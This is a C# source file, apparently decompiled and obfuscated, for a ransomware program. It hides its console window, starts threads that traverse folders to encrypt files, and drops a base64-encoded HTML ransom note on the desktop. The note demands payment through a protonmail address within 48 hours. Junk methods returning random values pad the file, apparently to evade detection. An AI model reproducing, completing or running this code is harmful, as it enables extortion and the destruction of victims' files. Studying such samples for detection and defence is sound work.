using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace hkyiuiuljll;

internal class Program
{
	public class DummyParser : ifp
	{
		public void ParseFile(string filePath)
		{
			Thread.Sleep(0);
			Console.WriteLine("Parsing files");
		}
	}

	private const int YA0zxYeMPsnEQQWNEQWzt98RPvaGT0sMsvf60PQhY4ggYwUpq7K = 0;

	private const int gUhwUpKvexhIpresJt2g1B9bZpAzK5AAmMsibX5dnEOT9Indq3zoG2JbqXquQb = 5;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr DpPkwFcQ3grSlT8RSWV584FOM58R4JWYvtEYV9DfeR7YRVovjLmpZzNqUInqDJ99QD, int yzrL78spbobEOILwwaybcrQr6RJLB05pKElFWt8Ba0e1mJlWUTO1K3FlnNR44Qc);

	private static void Main(string[] args)
	{
		Thread.Sleep(0);
		ShowWindow(GetConsoleWindow(), 0);
		iep iep2 = new xep();
		ifp aIyqefJM1MwB4DyjBdKEP7xb8QmWPmDSUZ4ifX9rvjrUqLdlrBDlwj8spcy8i = new fp(iep2);
		ifc uL8XBJQIYTx8MOGD4LWr8soC4Lh9hcxbTe7XxV5iHIKVn5kij63I1qJ97eivy1UhdY = new fc();
		List<Thread> encryptionThreads = GetEncryptionThreads(((ide)new FolderBrowser()).GetStartingFolders(), new dw(uL8XBJQIYTx8MOGD4LWr8soC4Lh9hcxbTe7XxV5iHIKVn5kij63I1qJ97eivy1UhdY, aIyqefJM1MwB4DyjBdKEP7xb8QmWPmDSUZ4ifX9rvjrUqLdlrBDlwj8spcy8i));
		encryptionThreads.ForEach(delegate(Thread encThread)
		{
			encThread.Start();
		});
		iep2.GetEncryptionKey();
		byte[] bytes = Convert.FromBase64String("PGh0bWwgbGFuZz0iZW4iPgo8aGVhZD48L3N0eWxlPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPHRpdGxlPkVuY3J5cHRlZDwvdGl0bGU+CjwvaGVhZD4KCjxib2R5PgogIDxzdHlsZT4KICAgYm9keSB7CiAgICBiYWNrZ3JvdW5kOiAjMDAwMDAwOwogICAgY29sb3I6ICNGRjAwMDA7Cglmb250LXNpemU6IDE3cHg7Cgl0ZXh0LWFsaWduOiBjZW50ZXIKICAgfQogIDwvc3R5bGU+CjxoMz5Pb3BzLCB5b3VyIHBlcnNvbmFsIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQhPC9oMz4KPGgzPldlIGRpZG4ndCBjaGFuZ2UgdGhlIGZpbGUgZXh0ZW5zaW9ucywgYnV0IHdlIGFkZGVkIGEgY2VydGFpbiBudW1iZXIgb2YgYnl0ZXMgdG8gZWFjaCBvZiB0aGVtPC9oMz4KPGgzPk5vdyB3aGVuIG9wZW5pbmcgYW55IG9mIHlvdXIgZmlsZXMsIHRoZXJlIHdpbGwgYmUgYW4gZXJyb3I8L2gzPgo8aDM+SWYgeW91IHdhbnQgdG8gcmV0dXJuIHlvdXIgZmlsZXMsIHlvdSB3aWxsIGhhdmUgdG8gbWVldCBvdXIgY29uZGl0aW9uIGFuZCBwYXkgdXMuPC9oMz4KPGgzPkZvciBkZXRhaWxlZCBpbnN0cnVjdGlvbnMsIHBsZWFzZSBlbWFpbCB1czwvaDM+CjxoMz5ya2hhaXJuQHByb3Rvbm1haWwuY29tPC9oMz4gCjxoMz5CdXQgcmVtZW1iZXIsIHlvdSBvbmx5IGhhdmUgNDggaG91cnMgZnJvbSB0aGUgbW9tZW50IG9mIGVuY3J5cHRpb24gdG8gY29udGFjdCB1cyBhbmQgcGF5LjwvaDM+CjxoMz5IdXJyeSB1cCwgYmVjYXVzZSBhZnRlciA0OCBob3VycyBrZXkgZm9yIGRlY3J5cHRpbmcgeW91ciBmaWxlcyB3aWxsIGJlIGRlbGV0ZWQgZnJvbSBvdXIgc2VydmVyIGFuZCB5b3VyIGZpbGVzIHdpbGwgYmUgaW1wb3NzaWJsZSB0byByZXR1cm4hPC9oMz4KPC9ib2R5PgoKPC9odG1sPg==");
		new MessageWriter(Encoding.UTF8.GetString(bytes), "Read me!", 12).WriteMessageToDesktop();
		encryptionThreads.ForEach(delegate(Thread encThread)
		{
			encThread?.Join();
		});
	}

	private static List<Thread> GetEncryptionThreads(List<string> list_0, dw PsCiTJniJQ9oyDw2gxM5IOvWLXwnLgCJca4UkZVRuh5tRIoebWs3)
	{
		List<Thread> list = new List<Thread>();
		foreach (string folder in list_0)
		{
			list.Add(new Thread((ThreadStart)delegate
			{
				PsCiTJniJQ9oyDw2gxM5IOvWLXwnLgCJca4UkZVRuh5tRIoebWs3.TraverseDirectories(folder);
			}));
		}
		return list;
	}

	public static string smethod_0()
	{
		return "dWVfN8lKC7z2OOpW4jgqwYkJlNZh8ZE615FQqZXP03vhZlfQD0zPzzc";
	}

	public static int g98oauf1WydBjFw8U4HejGghG3ZNu6baq0xw8b7syY3SXvkz23()
	{
		return 899841623;
	}

	public static string ddf61kssm3tTODuMbnlPUUMQOoQRPtInxGdgu9hF01BPvCc4yt()
	{
		return "3TFrKRxpqQ3R47tOjpduGq1zNmvBltIMV6Jc4jHiIVCwKaImUCtsogkBvzDeI";
	}

	public static int XCommaBHxOZUjZTt9DgBHSfJrmRrlcH0R1SF7BrQXbXw7WpoJh()
	{
		return 212145996;
	}

	public static string xaz6DUF8iyrxb0mCMTmPWNSxT35soK0aHGUOVQIGtiGJeEdgc0()
	{
		return "ti8j3UlEy4XAcixRdzzeQLqvnGYMSd89kiD0AjAj9gRGlvlg6DC";
	}

	public static int qV8Qyvo3T6kspSaNTl6JmfsmKAxhu2L1SoZzZAEN31yEhkatqq()
	{
		return 115621800;
	}

	public static string PZ3hegAzJyFEVLWfXJCaBJufnjcRZum3BA6HKKf58CpmDwsqxh()
	{
		return "aL6md1NGpJdELFdroF7m9mUIcxnU4sODam2IFe3YO3EGKD8qVBMA6FMUl4xcdAjX9XFSs";
	}

	public static int DPFeH6giZ0AQMWcIyjjMaY8ajI2rMYKhSiXlaBDds1NM6YodgF()
	{
		return 783184171;
	}

	public static string iQPt0GMhhj0Ny8fsX6CIm8l9Iwm8qJmSG5MlfiRkSIU6A9oBky()
	{
		return "xBepPMcsQhtYUV5pon8JFhHpauZL0bLl9FJj1kUQHPy0ZQFCQSkX2";
	}

	public static int f8MJyTszY3nBKqTJmQodNrIEzfvVyP8KY957Tr11AmgFWsJXZe()
	{
		return 438881227;
	}
}
